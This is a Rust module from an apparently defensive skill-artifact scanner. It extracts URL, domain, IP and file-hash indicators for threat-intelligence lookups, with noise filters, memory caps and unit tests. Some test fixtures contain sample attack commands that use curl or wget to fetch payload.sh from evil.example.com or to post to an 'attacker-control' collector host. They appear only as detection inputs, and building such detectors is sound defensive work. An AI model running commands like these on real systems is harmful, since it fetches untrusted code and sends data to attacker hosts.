//! Pure-offline extraction of URL / domain / IP / file-hash indicators from
//! skill artifacts. The output feeds downstream enrichment tooling (e.g. the
//! CLI's VT lookup) without adding any runtime dependency on the network from
//! inside the core scanner.
//!
//! Design principles:
//! - Deterministic, regex-based, no HTTP.
//! - Always-on for scanned artifacts — the output is cheap to compute and
//!   serialises to JSON so consumers can optionally fan it out to
//!   enrichment services.
//! - Conservative: only extract what we can recognise structurally; no
//!   fuzzy inference.

use crate::lazy_pattern;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

lazy_pattern!(
    URL_PATTERN,
    r#"(?i)https?://[^\s"'<>`\{\}\[\]\(\)\\]{3,512}"#
);

lazy_pattern!(
    IPV4_PATTERN,
    r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\b"
);

// IPv6 is loose on purpose: catches full 8-group and compressed
// (`::`) forms. Word boundaries prevent matching inside larger
// hex-colon identifiers (custom UUIDs, opaque tokens) that
// happen to contain `≥2` colons — without `\b` the second
// alternative would gladly match an arbitrary
// `abc1:abc2:abc3:abc4:abc5:abc6:abc7:abc8` substring.
lazy_pattern!(
    IPV6_PATTERN,
    r"\b(?:(?:[A-Fa-f0-9]{1,4}:){1,7}(?::[A-Fa-f0-9]{1,4}){1,7}|(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4})\b"
);

// Standalone host mentions like "sphinx.espuny.net:5000" without
// scheme. Very conservative to avoid matching filenames / dotted
// identifiers. Requires a TLD of ≥2 lowercase letters and rejects
// obvious programming patterns (e.g. `object.method`).
lazy_pattern!(
    HOST_MENTION_PATTERN,
    r"\b([a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?)+\.(?:com|net|org|io|dev|ai|fly\.dev|vercel\.app|co|me|xyz|app|cloud|tech|info|biz|pro|us|uk|de|fr|es|it|ru|cn|jp|hk|tw|kr|sg|in|br|mx|ca|au|nz|za|ae|tr|il|ch|nl|be|se|no|fi|dk|pl|ir|pk|sa|eg|th|vn|ph|id|my|ng))\b"
);

/// Collection of IOCs extracted from a single artifact (or package-level
/// aggregate across many artifacts). All values are deduplicated and sorted
/// so downstream cache keys are stable.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExtractedIocs {
    pub urls: Vec<String>,
    pub domains: Vec<String>,
    pub ipv4: Vec<String>,
    pub ipv6: Vec<String>,
    /// (relative-path, sha256-hex) of each supporting artifact we hashed.
    pub file_hashes: Vec<FileHash>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FileHash {
    pub path: PathBuf,
    pub sha256: String,
}

impl ExtractedIocs {
    pub fn is_empty(&self) -> bool {
        self.urls.is_empty()
            && self.domains.is_empty()
            && self.ipv4.is_empty()
            && self.ipv6.is_empty()
            && self.file_hashes.is_empty()
    }

    /// Merge another extraction into `self`, deduplicating inline.
    pub fn merge(&mut self, other: ExtractedIocs) {
        fn merge_sorted(target: &mut Vec<String>, additions: Vec<String>) {
            let mut set: BTreeSet<String> = target.drain(..).collect();
            set.extend(additions);
            *target = set.into_iter().collect();
        }
        merge_sorted(&mut self.urls, other.urls);
        merge_sorted(&mut self.domains, other.domains);
        merge_sorted(&mut self.ipv4, other.ipv4);
        merge_sorted(&mut self.ipv6, other.ipv6);

        let mut seen: BTreeSet<(PathBuf, String)> = self
            .file_hashes
            .drain(..)
            .map(|h| (h.path, h.sha256))
            .collect();
        for h in other.file_hashes {
            seen.insert((h.path, h.sha256));
        }
        self.file_hashes = seen
            .into_iter()
            .map(|(path, sha256)| FileHash { path, sha256 })
            .collect();
    }
}

/// Domains that must never be reported — loopback, localhost variants, and
/// documentation/testing ranges. These otherwise pollute the IOC list and
/// burn enrichment quota.
const NOISE_DOMAINS: &[&str] = &[
    "localhost",
    "localhost.localdomain",
    "example.com",
    "example.org",
    "example.net",
    "test.com",
    "invalid",
];

const NOISE_IPV4_PREFIXES: &[&str] = &[
    "127.",     // loopback
    "0.0.0.0",  // unspecified (exact string match below)
    "10.",      // RFC1918 — common internal, skip noise
    "192.168.", // RFC1918
    "169.254.", // link-local (incl. IMDS — we keep via a separate keep-list)
                // 172.16.0.0/12 (172.16.0.0 – 172.31.255.255) is handled by
                // `is_rfc1918_172` because the second octet has a numeric range that a
                // string prefix cannot express. Using "172.16." here would only match
                // /16, leaving 172.17.x.x (default Docker bridge) through 172.31.x.x
                // unfiltered — those would leak into VT lookups as false-positive IOCs.
];

/// IPv4 addresses we deliberately *keep* even though they'd otherwise be
/// filtered as internal — they have threat-intel value.
const KEEP_SPECIAL_IPV4: &[&str] = &[
    "169.254.169.254", // cloud metadata service
];

/// Hard upper bound on the number of distinct IOC strings of any single
/// kind (URLs, domains, IPv4, IPv6) extracted from one artifact.
/// Mitigates a memory-exhaustion vector where a crafted artifact ships
/// millions of unique URLs / IPs and the unbounded `BTreeSet`s grow
/// to several GB before returning. The limit is generous enough that
/// a real package with hundreds of unique IOCs is unaffected, while a
/// 50 MB synthetic file with a million unique URLs is truncated with
/// a `tracing::warn` so operators see the cap was hit.
pub const MAX_IOCS_PER_KIND_PER_ARTIFACT: usize = 4_096;

/// Upper bound on the span of an artifact scanned for IOCs. The per-kind
/// output sets are capped, but each regex pass still materialises EVERY
/// match into an intermediate `Vec<PatternMatch>` (each cloning its
/// matched text) before that cap applies — so a multi-hundred-MB artifact
/// of densely packed URL/IP tokens grows several GB of transient match
/// vectors regardless of the output cap. Bounding the scanned span caps
/// that transient growth. A legitimate skill's indicators sit far inside
/// this window; content past it on a multi-MB artifact is attacker
/// padding. Mirrors the existing NOVA per-body cap.
pub const MAX_IOC_SCAN_BYTES: usize = 16 * 1024 * 1024;

/// Extract IOCs from a single artifact's textual content plus its path.
/// `path` is used for (a) computing the file hash and (b) attaching to the
/// returned FileHash record.
pub fn extract_from_artifact(path: &Path, content: &[u8]) -> ExtractedIocs {
    let mut out = if let Ok(text) = std::str::from_utf8(content) {
        extract_from_text(text)
    } else {
        // Lossy decode so we can still find ASCII IOCs embedded in binaries.
        let lossy = String::from_utf8_lossy(content);
        extract_from_text(&lossy)
    };
    out.file_hashes.push(FileHash {
        path: path.to_path_buf(),
        sha256: sha256_hex(content),
    });
    out
}

/// Extract URL/domain/IP indicators from a string (no file-hash computed).
///
/// Each output kind is capped at [`MAX_IOCS_PER_KIND_PER_ARTIFACT`].
/// Reaching the cap emits a `tracing::warn!` so operators can tell when
/// truncation occurred. Pre-fix the `BTreeSet`s grew without bound, so
/// a crafted 50 MB artifact with millions of unique URLs / IPs caused
/// several-GB heap growth before returning.
pub fn extract_from_text(text: &str) -> ExtractedIocs {
    // Bound the scanned span so each regex pass cannot materialise an
    // unbounded intermediate match vector before the per-kind output caps
    // apply. Truncate to a UTF-8 char boundary at or below the cap.
    let text = if text.len() > MAX_IOC_SCAN_BYTES {
        let mut end = MAX_IOC_SCAN_BYTES;
        while end > 0 && !text.is_char_boundary(end) {
            end -= 1;
        }
        tracing::warn!(
            cap = MAX_IOC_SCAN_BYTES,
            len = text.len(),
            "ioc_extraction: artifact exceeds IOC scan cap; scanning only the leading window"
        );
        &text[..end]
    } else {
        text
    };
    let mut urls: BTreeSet<String> = BTreeSet::new();
    let mut domains: BTreeSet<String> = BTreeSet::new();
    let mut ipv4: BTreeSet<String> = BTreeSet::new();
    let mut ipv6: BTreeSet<String> = BTreeSet::new();

    /// Insert into a bounded IOC set; returns `false` once the set is
    /// at capacity. Callers stop their inner loop on `false` so they
    /// do not keep allocating regex matches into a discarded value.
    fn try_insert_bounded(set: &mut BTreeSet<String>, value: String, kind: &'static str) -> bool {
        if set.len() >= MAX_IOCS_PER_KIND_PER_ARTIFACT {
            tracing::warn!(
                kind,
                cap = MAX_IOCS_PER_KIND_PER_ARTIFACT,
                "ioc_extraction: per-artifact IOC cap reached; truncating further matches"
            );
            return false;
        }
        set.insert(value);
        true
    }

    let url_matches = URL_PATTERN.find_matches(text);
    for m in &url_matches {
        let raw = m.matched_text.as_str();
        let trimmed = raw.trim_end_matches([',', '.', ';', ':', ')', ']', '}', '!', '?']);
        if !try_insert_bounded(&mut urls, trimmed.to_string(), "url") {
            break;
        }
        if let Some(host) = extract_host_from_url(trimmed) {
            if !is_noise_domain(&host) && !is_ipv4(&host) && !is_ipv6(&host) {
                // Domain cap reached: skip insertion but keep scanning URLs.
                // Check cap before calling try_insert_bounded to avoid
                // repeated warn! on every URL-domain pair after the cap.
                if domains.len() < MAX_IOCS_PER_KIND_PER_ARTIFACT {
                    try_insert_bounded(&mut domains, host, "domain");
                }
            }
        }
    }

    let mut host_mention_text = text.to_string();
    for m in url_matches {
        host_mention_text.replace_range(m.start..m.end, &" ".repeat(m.end - m.start));
    }
    for m in HOST_MENTION_PATTERN.find_matches(&host_mention_text) {
        let host = m.matched_text.to_ascii_lowercase();
        if !is_noise_domain(&host) && !try_insert_bounded(&mut domains, host, "domain") {
            break;
        }
    }

    for m in IPV4_PATTERN.find_matches(text) {
        let ip = m.matched_text.as_str();
        if !is_noise_ipv4(ip) && !try_insert_bounded(&mut ipv4, ip.to_string(), "ipv4") {
            break;
        }
    }

    let text_bytes = text.as_bytes();
    for m in IPV6_PATTERN.find_matches(text) {
        // An IPv6 match immediately followed by `.<digit>` is the hex
        // prefix of an IPv4-mapped/embedded address (`::ffff:1.2.3.4`,
        // `64:ff9b::1.2.3.4`). The pattern has no embedded-IPv4 tail, so it
        // stops at the first `.` and the prefix still contains `::`, which
        // passes `is_plausible_ipv6` — emitting a garbled indicator
        // (`::ffff:1`) that never appeared in the artifact into IOC output
        // and downstream VT lookups. Reject the truncated match.
        let truncates_embedded_ipv4 = text_bytes.get(m.end) == Some(&b'.')
            && text_bytes.get(m.end + 1).is_some_and(u8::is_ascii_digit);
        if truncates_embedded_ipv4 {
            continue;
        }
        let ip = m.matched_text;
        // Mirror `is_ipv6`: require colon-group boundary AND a plausible
        // IPv6 shape. Without `is_plausible_ipv6` the extractor silently
        // accepted hex-colon tokens (e.g. 4-group session IDs without `::`
        // and without 8 groups) that `is_ipv6` would reject — leaking
        // false-positive IOCs into VT lookups and finding evidence.
        if ip.matches(':').count() >= 2
            && is_plausible_ipv6(&ip)
            && !try_insert_bounded(&mut ipv6, ip, "ipv6")
        {
            break;
        }
    }

    ExtractedIocs {
        urls: urls.into_iter().collect(),
        domains: domains.into_iter().collect(),
        ipv4: ipv4.into_iter().collect(),
        ipv6: ipv6.into_iter().collect(),
        file_hashes: Vec::new(),
    }
}

fn extract_host_from_url(url: &str) -> Option<String> {
    url::Url::parse(url)
        .ok()
        .and_then(|parsed| parsed.host_str().map(str::to_ascii_lowercase))
        .filter(|host| !host.is_empty())
}

fn is_noise_domain(domain: &str) -> bool {
    let d = domain.to_ascii_lowercase();
    NOISE_DOMAINS.iter().any(|n| d == *n)
}

fn is_noise_ipv4(ip: &str) -> bool {
    if KEEP_SPECIAL_IPV4.contains(&ip) {
        return false;
    }
    if ip == "0.0.0.0" {
        return true;
    }
    if NOISE_IPV4_PREFIXES
        .iter()
        .any(|prefix| ip.starts_with(prefix))
    {
        return true;
    }
    is_rfc1918_172(ip)
}

/// Match the RFC1918 172.16.0.0/12 block (172.16.0.0 – 172.31.255.255).
///
/// String-prefix matching can't express the numeric range on the second
/// octet, so we parse it explicitly. Without this check, 172.17.x.x (the
/// default Docker bridge subnet) through 172.31.x.x would pass as
/// public-looking IOCs and leak into VT lookups.
fn is_rfc1918_172(ip: &str) -> bool {
    let mut parts = ip.split('.');
    let (Some(a), Some(b)) = (parts.next(), parts.next()) else {
        return false;
    };
    if a != "172" {
        return false;
    }
    matches!(b.parse::<u8>(), Ok(16..=31))
}

fn is_ipv4(s: &str) -> bool {
    IPV4_PATTERN.is_match(s) && s.matches('.').count() == 3
}

fn is_ipv6(s: &str) -> bool {
    s.matches(':').count() >= 2 && IPV6_PATTERN.is_match(s) && is_plausible_ipv6(s)
}

/// Reject 8-group hex-colon strings that look like custom session
/// identifiers rather than addresses. The regex `\b...\b` boundary
/// alone cannot stop tokens like `=abc1:abc2:...:abc8 ` whose
/// surrounding chars are also `\W`. Compressed forms (`::`) are real
/// IPv6 by structure; full 8-group forms must additionally satisfy the
/// per-group length constraint (≤4 hex chars).
fn is_plausible_ipv6(s: &str) -> bool {
    if s.contains("::") {
        return true;
    }
    let groups: Vec<&str> = s.split(':').collect();
    groups.len() == 8 && groups.iter().all(|g| !g.is_empty() && g.len() <= 4)
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    format!("{:x}", hasher.finalize())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// # Contract
    ///
    /// `extract_from_text` MUST cap each IOC kind at
    /// `MAX_IOCS_PER_KIND_PER_ARTIFACT`. Pre-fix the `BTreeSet`s grew
    /// without bound, so a crafted artifact with millions of unique
    /// URLs caused multi-GB heap growth before returning. The cap is
    /// generous enough that real packages (hundreds of unique IOCs)
    /// are unaffected; we hit it only on synthetic adversarial input.
    #[test]
    fn extract_from_text_caps_url_count_per_artifact() {
        let mut text = String::new();
        // Synthesise more URLs than the cap so we know truncation fires.
        let target = MAX_IOCS_PER_KIND_PER_ARTIFACT + 256;
        for n in 0..target {
            use std::fmt::Write;
            let _ = writeln!(text, "see https://example-{n}.test/ for details");
        }
        let iocs = extract_from_text(&text);
        assert!(
            iocs.urls.len() <= MAX_IOCS_PER_KIND_PER_ARTIFACT,
            "URL set must be capped at {}; got {}",
            MAX_IOCS_PER_KIND_PER_ARTIFACT,
            iocs.urls.len()
        );
    }

    /// # Contract
    ///
    /// `extract_from_text` scans only the leading `MAX_IOC_SCAN_BYTES` of
    /// an oversized artifact, so each regex pass cannot materialise an
    /// unbounded intermediate match vector. An IOC inside the window is
    /// still found; one past the cap is not scanned.
    #[test]
    fn extract_from_text_bounds_scan_span() {
        let mut text = String::with_capacity(MAX_IOC_SCAN_BYTES + 64);
        text.push_str("http://early.example/path ");
        text.push_str(&"x".repeat(MAX_IOC_SCAN_BYTES));
        text.push_str(" http://late.example/path");

        let iocs = extract_from_text(&text);

        assert!(
            iocs.urls.iter().any(|u| u.contains("early.example")),
            "an in-window IOC must be extracted"
        );
        assert!(
            !iocs.urls.iter().any(|u| u.contains("late.example")),
            "an IOC past the scan cap must not be scanned"
        );
    }

    #[test]
    fn extracts_urls_and_domains_from_script() {
        let text = "curl -s -X POST http://sphinx.espuny.net:5000/v1/audio ; wget https://evil.example.com/payload.sh";
        let iocs = extract_from_text(text);
        assert!(iocs
            .urls
            .iter()
            .any(|u| u.starts_with("http://sphinx.espuny.net:5000")));
        assert!(iocs
            .urls
            .iter()
            .any(|u| u.starts_with("https://evil.example.com")));
        assert!(iocs.domains.contains(&"sphinx.espuny.net".to_string()));
        // example.com is noise-filtered; evil.example.com stays.
        assert!(iocs.domains.iter().any(|d| d == "evil.example.com"));
    }

    /// # Contract
    ///
    /// URL IOC extraction treats schemes case-insensitively while preserving
    /// the original URL bytes returned to enrichment consumers.
    #[test]
    fn extracts_case_variant_url_schemes() {
        let iocs = extract_from_text("curl HTTPS://evil.example.com/payload.sh");

        assert!(iocs
            .urls
            .contains(&"HTTPS://evil.example.com/payload.sh".to_string()));
        assert!(iocs.domains.contains(&"evil.example.com".to_string()));
    }

    /// # Contract
    ///
    /// URL domain IOCs come from the URL authority. A hostname-shaped
    /// token after a path `@` is path data, not the destination host.
    #[test]
    fn extracts_url_domain_from_authority_not_path_userinfo_shape() {
        let iocs =
            extract_from_text("curl https://collector.attacker-control.io/path@api.openai.com/v1");

        assert!(iocs
            .domains
            .contains(&"collector.attacker-control.io".to_string()));
        assert!(!iocs.domains.contains(&"api.openai.com".to_string()));
    }

    /// # Contract (negative)
    ///
    /// Case-insensitive URL extraction must not widen to non-HTTP scheme
    /// lookalikes.
    #[test]
    fn rejects_non_http_scheme_lookalikes() {
        let iocs = extract_from_text("curl HTXP://evil.example.com/payload.sh");

        assert!(iocs.urls.is_empty(), "unexpected URLs: {:?}", iocs.urls);
    }

    #[test]
    fn filters_loopback_and_private_ips() {
        let text = "target = 127.0.0.1  fallback = 10.0.0.5  router = 192.168.1.1  public = 8.8.8.8  imds = 169.254.169.254";
        let iocs = extract_from_text(text);
        assert!(iocs.ipv4.contains(&"8.8.8.8".to_string()));
        assert!(iocs.ipv4.contains(&"169.254.169.254".to_string())); // IMDS kept
        assert!(!iocs.ipv4.contains(&"127.0.0.1".to_string()));
        assert!(!iocs.ipv4.contains(&"10.0.0.5".to_string()));
        assert!(!iocs.ipv4.contains(&"192.168.1.1".to_string()));
    }

    /// Contract: the RFC1918 172.16.0.0/12 block is fully filtered.
    /// Without `is_rfc1918_172`, only 172.16.x.x was suppressed via the
    /// "172.16." string prefix, leaving 172.17.x.x – 172.31.x.x (notably
    /// the default Docker bridge subnet) leaking into VT IOCs.
    #[test]
    fn is_noise_ipv4_covers_full_rfc1918_172_12_block() {
        for ip in [
            "172.16.0.1",
            "172.17.0.1", // default Docker bridge
            "172.18.0.42",
            "172.20.5.5",
            "172.31.255.255",
        ] {
            assert!(
                is_noise_ipv4(ip),
                "172.16.0.0/12 must be filtered; failed for {ip}"
            );
        }
        for ip in ["172.15.0.1", "172.32.0.1", "172.0.0.1"] {
            assert!(
                !is_noise_ipv4(ip),
                "{ip} is outside RFC1918 172.16.0.0/12 and must NOT be filtered"
            );
        }
    }

    /// E2E: real text with mixed IOCs proves the integration path
    /// (extraction → filter) honors the /12 contract end-to-end.
    #[test]
    fn extract_filters_full_rfc1918_172_12_block_e2e() {
        let text =
            "docker = 172.17.0.5  internal = 172.20.1.1  public = 9.9.9.9  edge = 172.32.0.1";
        let iocs = extract_from_text(text);
        assert!(!iocs.ipv4.contains(&"172.17.0.5".to_string()));
        assert!(!iocs.ipv4.contains(&"172.20.1.1".to_string()));
        assert!(iocs.ipv4.contains(&"9.9.9.9".to_string()));
        assert!(iocs.ipv4.contains(&"172.32.0.1".to_string()));
    }

    /// Contract: IPv6 extraction MUST require word boundaries. Otherwise
    /// arbitrary 8-group hex-colon identifiers (custom UUIDs, opaque
    /// tokens) embedded in code or logs would surface as IPv6 IOCs.
    #[test]
    fn ipv6_extraction_rejects_unbounded_hex_runs_in_identifiers() {
        let text = "token=xabc1:abc2:abc3:abc4:abc5:abc6:abc7:abc8x more text";
        let iocs = extract_from_text(text);
        assert!(
            iocs.ipv6.is_empty(),
            "IPv6 must NOT match inside identifier word characters; got {:?}",
            iocs.ipv6
        );
    }

    /// Contract: extraction MUST run `is_plausible_ipv6` to reject
    /// hex-colon tokens that match the regex but aren't real IPv6.
    /// A 4-group token like `abc1:def2:1234:5678` (no `::`, fewer than
    /// 8 groups) passes both the regex and the `colons >= 2` heuristic;
    /// without the plausibility gate it leaked into IOC output and was
    /// shipped to VT as a false positive. Mirrors `is_ipv6` (line 283).
    #[test]
    fn ipv6_extraction_rejects_short_hex_token_lacking_double_colon() {
        let text = "session = abc1:def2:1234:5678 next";
        let iocs = extract_from_text(text);
        assert!(
            iocs.ipv6.is_empty(),
            "4-group hex-colon token without `::` must NOT extract as IPv6; got {:?}",
            iocs.ipv6
        );
    }

    /// Sanity: legitimate IPv6 still extracts.
    #[test]
    fn ipv6_extraction_keeps_valid_addresses() {
        let text = "endpoint = 2001:db8::dead:beef:1; alt = fe80::1";
        let iocs = extract_from_text(text);
        assert!(
            iocs.ipv6.iter().any(|i| i.contains("2001:db8")),
            "Valid IPv6 must still match; got {:?}",
            iocs.ipv6
        );
    }

    /// Contract: an IPv4-mapped/embedded IPv6 address MUST NOT emit a
    /// truncated, garbled indicator. The pattern has no embedded-IPv4 tail,
    /// so it would otherwise stop at the first `.` and leak the hex prefix
    /// (e.g. `2001:db8::ffff:255`) into IOC output and VT lookups — an
    /// address that never appeared in the artifact. Rejecting the truncated
    /// match (a clean miss) is correct; emitting a wrong value is not.
    #[test]
    fn ipv6_extraction_does_not_emit_truncated_embedded_ipv4() {
        for text in [
            "endpoint = 2001:db8::ffff:255.255.255.255 done",
            "nat64 = 64:ff9b::192.0.2.33 here",
            "mapped = ::ffff:10.0.0.5 end",
        ] {
            let iocs = extract_from_text(text);
            assert!(
                !iocs
                    .ipv6
                    .iter()
                    .any(|i| { i.ends_with(":255") || i.ends_with(":192") || i.ends_with(":10") }),
                "must not emit a truncated embedded-IPv4 prefix; got {:?}",
                iocs.ipv6
            );
        }
    }

    /// Contract: `is_plausible_ipv6` rejects strings without `::` whose
    /// group structure does not match a strict 8-group form with each
    /// group 1..=4 hex chars. Compressed (`::`) forms always pass.
    #[test]
    fn is_plausible_ipv6_rejects_overlong_groups() {
        // 5-char group is invalid in IPv6.
        assert!(!is_plausible_ipv6(
            "aaaaa:bbbb:cccc:dddd:eeee:ffff:1111:2222"
        ));
    }

    #[test]
    fn is_plausible_ipv6_accepts_compressed_form() {
        assert!(is_plausible_ipv6("2001:db8::1"));
        assert!(is_plausible_ipv6("fe80::1"));
    }

    #[test]
    fn is_plausible_ipv6_accepts_full_8_group_form() {
        assert!(is_plausible_ipv6("2001:0db8:85a3:0000:0000:8a2e:0370:7334"));
    }

    #[test]
    fn hashes_artifact_content() {
        let iocs = extract_from_artifact(Path::new("script.sh"), b"hello world");
        assert_eq!(iocs.file_hashes.len(), 1);
        assert_eq!(
            iocs.file_hashes[0].sha256,
            // sha256("hello world")
            "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
        );
    }

    #[test]
    fn ipv6_basic_extraction() {
        let text = "endpoint = 2001:db8::dead:beef:1";
        let iocs = extract_from_text(text);
        assert!(iocs.ipv6.iter().any(|i| i.contains("2001:db8")));
    }

    #[test]
    fn deduplicates_and_sorts() {
        let text = "https://a.com/x  https://a.com/y  https://a.com/x 8.8.8.8 8.8.4.4 8.8.8.8";
        let iocs = extract_from_text(text);
        assert_eq!(
            iocs.ipv4,
            vec!["8.8.4.4".to_string(), "8.8.8.8".to_string()]
        );
        assert!(iocs.urls.len() >= 2);
    }

    #[test]
    fn merge_combines_disjoint_lists() {
        let mut a = extract_from_text("https://foo.com/x 1.1.1.1");
        let b = extract_from_text("https://bar.io/y 8.8.8.8");
        a.merge(b);
        assert!(a.domains.contains(&"foo.com".to_string()));
        assert!(a.domains.contains(&"bar.io".to_string()));
        assert!(a.ipv4.contains(&"1.1.1.1".to_string()));
        assert!(a.ipv4.contains(&"8.8.8.8".to_string()));
    }

    #[test]
    fn does_not_flag_programming_identifiers_as_domains() {
        let text = "object.method.name = func.call() # not a host";
        let iocs = extract_from_text(text);
        assert!(
            iocs.domains.is_empty(),
            "got false-positive: {:?}",
            iocs.domains
        );
    }

    /// # Contract
    ///
    /// When the domain cap is reached, `extract_from_text` MUST continue
    /// scanning URLs for their domains without emitting repeated
    /// `tracing::warn!` on every URL-domain pair. Pre-fix the code called
    /// `try_insert_bounded` on every domain after the cap, logging a warn
    /// for each — on adversarial inputs with thousands of URLs, this
    /// produced thousands of identical log lines.
    #[test]
    fn domain_cap_does_not_spam_repeated_warns() {
        let mut text = String::new();
        // Exceed the domain cap, then add more URLs to prove scanning
        // continues past the cap without calling try_insert_bounded.
        let target = MAX_IOCS_PER_KIND_PER_ARTIFACT + 100;
        for n in 0..target {
            use std::fmt::Write;
            let _ = writeln!(text, "see https://unique-{n}.example.com/");
        }
        let iocs = extract_from_text(&text);
        assert!(
            iocs.domains.len() <= MAX_IOCS_PER_KIND_PER_ARTIFACT,
            "domain set must be capped at {}; got {}",
            MAX_IOCS_PER_KIND_PER_ARTIFACT,
            iocs.domains.len()
        );
        // All URLs still scanned (the URL cap is independent).
        assert!(
            iocs.urls.len() <= MAX_IOCS_PER_KIND_PER_ARTIFACT,
            "URL set must also be capped; got {}",
            iocs.urls.len()
        );
    }
}
